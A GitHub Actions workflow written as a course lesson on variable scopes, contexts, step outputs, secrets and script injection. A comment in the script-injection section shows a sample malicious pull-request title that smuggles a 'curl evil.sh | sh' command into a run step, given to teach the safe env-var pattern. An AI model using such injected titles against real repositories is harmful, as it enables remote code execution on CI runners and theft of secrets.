# =============================================================================
# LESSON 05 — Contexts, variables, secrets, and passing data between steps
# =============================================================================
# Read COURSE/05-contexts-variables-secrets.md alongside this file.
#
# This is the lesson that turns Actions from "a script runner" into
# "a programmable system". It is also where the security rules live, so
# read the SECRETS section even if you skim the rest.
# =============================================================================

name: 05 - Contexts and Secrets

on:
  workflow_dispatch:
  push:
    branches: [main]
    paths: ['.github/workflows/05-contexts-and-secrets.yml']

# ---------------------------------------------------------------------------
# ENVIRONMENT VARIABLES come in three scopes. Innermost wins.
# ---------------------------------------------------------------------------
env:
  # Workflow level: visible to every step of every job below.
  APP_NAME: Quote of the Day
  SCOPE_DEMO: workflow-level

jobs:
  contexts:
    name: Explore the contexts
    runs-on: ubuntu-latest

    env:
      # Job level: overrides the workflow value for this job only.
      SCOPE_DEMO: job-level

    steps:
      - uses: actions/checkout@v4

      # -------------------------------------------------------------------
      # PART 1 — Variable scoping
      # -------------------------------------------------------------------
      - name: Scope demonstration
        env:
          # Step level: the innermost scope, and the narrowest. Prefer it.
          SCOPE_DEMO: step-level
        run: |
          echo "APP_NAME   = $APP_NAME"
          echo "SCOPE_DEMO = $SCOPE_DEMO   <- step beats job beats workflow"

      - name: Without a step-level override
        run: echo "SCOPE_DEMO = $SCOPE_DEMO"

      # -------------------------------------------------------------------
      # PART 2 — The contexts
      #
      # `github`  — the event and repo. Read-only.
      # `env`     — the variables above.
      # `job`     — status of the running job.
      # `runner`  — facts about the machine (os, arch, temp dirs).
      # `steps`   — outputs of earlier steps in this job.
      # `needs`   — outputs of jobs this one depends on (Lesson 08).
      # `secrets` — encrypted values. Never printed.
      # `vars`    — plaintext repo/org configuration.
      # `inputs`  — workflow_dispatch or workflow_call inputs.
      # -------------------------------------------------------------------
      - name: Useful github context fields
        run: |
          echo "repository     : ${{ github.repository }}"
          echo "repository_owner: ${{ github.repository_owner }}"
          echo "ref_name       : ${{ github.ref_name }}"
          echo "ref_type       : ${{ github.ref_type }}"
          echo "sha            : ${{ github.sha }}"
          echo "actor          : ${{ github.actor }}"
          echo "workflow       : ${{ github.workflow }}"
          echo "job            : ${{ github.job }}"
          echo "run_id         : ${{ github.run_id }}"
          echo "run_number     : ${{ github.run_number }}"
          echo "run_attempt    : ${{ github.run_attempt }}"
          echo "workspace      : ${{ github.workspace }}"

      - name: Runner context
        run: |
          echo "runner.os    : ${{ runner.os }}"
          echo "runner.arch  : ${{ runner.arch }}"
          echo "runner.temp  : ${{ runner.temp }}"

      # The nuclear option for debugging: dump a whole context as JSON.
      # `toJSON()` is essential here — a context is an object, and
      # interpolating it directly gives you the useless string "[object Object]".
      - name: Dump the whole github context
        run: echo "$CONTEXT_JSON"
        env:
          # Note the indirection through env. Pasting untrusted values
          # straight into `run:` is a script-injection hole — see PART 5.
          CONTEXT_JSON: ${{ toJSON(github) }}

      # -------------------------------------------------------------------
      # PART 3 — Passing data BETWEEN steps
      #
      # Shell variables die with their step. To pass a value forward you
      # write to one of two special files:
      #   $GITHUB_OUTPUT — a named output, read via the `steps` context
      #   $GITHUB_ENV    — an env var for all LATER steps
      # -------------------------------------------------------------------
      - name: Produce some outputs
        # An `id:` is what makes a step referenceable.
        id: facts
        run: |
          QUOTE_COUNT=$(node -e "import('./src/lib/quotes.js').then(m => console.log(m.quotes.length))")

          echo "short_sha=${GITHUB_SHA:0:7}" >> "$GITHUB_OUTPUT"
          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"
          echo "quote_count=$QUOTE_COUNT" >> "$GITHUB_OUTPUT"

      - name: Consume those outputs
        run: |
          echo "short sha   : ${{ steps.facts.outputs.short_sha }}"
          echo "timestamp   : ${{ steps.facts.outputs.timestamp }}"
          echo "quote count : ${{ steps.facts.outputs.quote_count }}"

      # Multi-line values need a heredoc delimiter, otherwise the file
      # format breaks. Use a random-ish delimiter that cannot appear in
      # the content.
      - name: A multi-line output
        id: multiline
        run: |
          {
            echo 'report<<QOTD_EOF'
            echo 'line one'
            echo 'line two'
            echo 'line three'
            echo 'QOTD_EOF'
          } >> "$GITHUB_OUTPUT"

      - name: Read it back
        run: |
          cat <<'EOF'
          ${{ steps.multiline.outputs.report }}
          EOF

      - name: Set an env var for all later steps
        run: echo "BUILD_TAG=v${{ github.run_number }}-${GITHUB_SHA:0:7}" >> "$GITHUB_ENV"

      - name: Use it
        run: echo "BUILD_TAG is $BUILD_TAG"

      # -------------------------------------------------------------------
      # PART 4 — SECRETS
      #
      # Set them at: repo Settings -> Secrets and variables -> Actions.
      #
      #   Secrets   = encrypted, write-only, masked in logs. Tokens, keys.
      #   Variables = plaintext, readable by anyone with repo access.
      #               Config: region names, feature flags, URLs.
      #
      # GITHUB_TOKEN is created automatically for every run and expires when
      # the run ends. You do not need to create it. Lesson 10 uses it.
      #
      # RULES:
      #   1. Never echo a secret. GitHub masks exact matches, but base64,
      #      substrings, or a secret split across lines will leak.
      #   2. Secrets are NOT available to workflows triggered by
      #      `pull_request` from a fork. That is deliberate — otherwise any
      #      stranger could open a PR that prints your keys.
      #   3. Pass secrets via `env:`, never by interpolating into `run:`.
      # -------------------------------------------------------------------
      - name: Is a secret configured?
        env:
          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
        run: |
          if [ -z "$DEMO_SECRET" ]; then
            echo "No DEMO_SECRET set. Add one in Settings to see this work."
          else
            echo "DEMO_SECRET exists and is ${#DEMO_SECRET} characters long."
            echo "Watch GitHub mask it: $DEMO_SECRET"
          fi

      - name: Repository variables are plaintext
        run: |
          echo "vars.DEMO_VARIABLE = '${{ vars.DEMO_VARIABLE }}'"
          echo "(empty unless you created it under Settings -> Variables)"

      # -------------------------------------------------------------------
      # PART 5 — SCRIPT INJECTION, the one security mistake to memorise
      #
      # THIS IS DANGEROUS:
      #     run: echo "${{ github.event.pull_request.title }}"
      #
      # Because `${{ }}` is substituted textually BEFORE bash parses the
      # line. A PR titled:  a"; curl evil.sh | sh; #
      # becomes a command. The attacker needs no repo access whatsoever.
      #
      # THE FIX: route untrusted input through an env var. The shell then
      # treats it as data, never as code.
      # -------------------------------------------------------------------
      - name: The safe pattern for untrusted input
        env:
          UNTRUSTED_TITLE: ${{ github.event.head_commit.message }}
        run: |
          echo "Commit message received safely:"
          echo "$UNTRUSTED_TITLE"

      - name: Summary
        run: |
          {
            echo "## Lesson 05"
            echo "- Build tag: \`$BUILD_TAG\`"
            echo "- Short SHA: \`${{ steps.facts.outputs.short_sha }}\`"
            echo "- Quotes shipped: ${{ steps.facts.outputs.quote_count }}"
          } >> "$GITHUB_STEP_SUMMARY"
